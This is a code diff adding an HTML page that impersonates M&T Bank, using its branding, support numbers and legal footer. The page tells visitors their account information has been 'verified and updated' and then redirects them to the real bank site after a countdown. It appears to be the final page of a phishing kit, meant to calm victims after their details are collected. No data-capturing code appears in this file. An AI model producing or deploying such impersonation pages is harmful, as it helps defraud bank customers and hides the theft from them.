@@ -1,0 +1,78 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    
+    <link rel="stylesheet" href="../static/css/index.css">
+    
+    <title>Sign On to View Your Personal Accounts | M&T</title>
+</head>
+<body onload="linking_acc()">
+    <div class="navbar">
+        <div class="brand">
+            <img src="../static/images/brand.png" alt="">
+        </div>
+    </div>
+
+    <div style="padding-top: 5px;" class="middle-form">
+        <p style="font-size: 28px; color: #007856; text-align: center;"> Your Account has been updated! </p>
+
+        <p style="margin-bottom: 30px; color: #007856;" class='middle'>Thanks for verifying your Information. We will redirect you to the homepage.</p>
+        
+       
+        <div style="text-align: center; background: #007856; border: 2px solid #007856; width: 50%; margin: 40px auto; border-radius: 6px;" class="neutral-link">
+            <a id="count-down" style="font-family: Georgia, 'Times New Roman', Times, serif; text-decoration: none; color: white;">10</a>
+        </div>
+
+        <br />
+    
+    <hr>
+
+    <p>Have questions about M&T Online Banking?</p>
+    <a href="">Personal Accounts: 1-800-790-9130</a>
+    <p>Monday - Friday 8am - 9pm ET</p>
+    <p>Saturday - Sunday 9am - 5pm ET</p>
+
+    <a href="">Business Accounts: 1-800-724-6070</a>
+        
+        </div>      
+    </div>
+
+    <div class="footer">
+
+        <p><a href="">Get Started Guide</a> <span class="footer-link-line">|</span> <a href="">Security Assistance</a> <span class="footer-link-line">|</span> <a href="">Digital Service</a> <br> <a href="">Agreement</a> <span class="footer-link-line">|</span> <a href="">Esign Agreement</a> <span class="footer-link-line">|</span> <a href="">Accessibility</a> <span class="footer-link-line">|</span> <a href="">mtb.com</a>  </p>
+        <p>&copy;2022 M&T Bank. All Rights Reserved.</p>
+        <p>Users of this website agree to be bound by the provisions of the M&T website <a href="">Terms of use</a> and <a href="">Privacy Policy</a> </p>
+        <div class="footer-img" >
+          <div>
+            <img src="../static/images/equity.png" alt="" srcset="">
+          </div>
+      
+          <div>
+            <h3 style="color: grey;">EQUITY</h3>
+          </div>
+          
+        </div>
+        <p>Equal Housing Lender NMLS #381076 <a href="">Member FDIC</a></p>
+      </div>
+
+    <script>
+        function linking_acc(){
+    var word = document.getElementById('count-down');
+    var time = 10;
+    setInterval(timer, 1000)
+    function timer(){
+        if(time > 0){
+            time --
+            word.innerHTML = time
+        } 
+        if(time == 1){
+            window.location.replace('https://www3.mtb.com')
+        }
+    }
+}
+    </script>
+</body>
+</html>
